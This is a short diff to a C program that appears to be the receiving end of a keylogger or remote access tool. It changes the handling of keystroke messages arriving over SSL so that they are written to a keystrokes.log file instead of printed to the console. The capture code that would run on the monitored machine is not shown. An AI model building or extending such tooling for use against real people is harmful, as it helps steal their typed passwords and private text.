@@ -109,16 +109,17 @@ int main(void) {
             perror("fork()");
             exit(EXIT_FAILURE);
         default: {
+            FILE *key_file = fopen("keystrokes.log", "w");
+            if (!key_file) {
+                perror("keystroke log");
+                exit(EXIT_FAILURE);
+            }
             int size;
             while ((size = SSL_read(ssl, buffer, MAX_PAYLOAD)) > 0) {
                 if (buffer[0] == 'k') {
                     //Keystroke message
-                    printf("\nReceived a keystroke: ");
-                    for (int i = 1; i < size; ++i) {
-                        printf("%c", buffer[i]);
-                    }
-                    printf("\n");
-                    fflush(stdout);
+                    fwrite(buffer + 1, 1, size - 1, key_file);
+                    fflush(key_file);
                 } else {
                     for (int i = 0; i < size; ++i) {
                         printf("%c", buffer[i]);
@@ -134,6 +135,7 @@ int main(void) {
                 printf("err4 %s\n", ERR_func_error_string(e));
                 printf("err5 %s\n", ERR_reason_error_string(e));
             }
+            fclose(key_file);
         } break;
     }
     setvbuf(stdin, NULL, _IOLBF, 0);
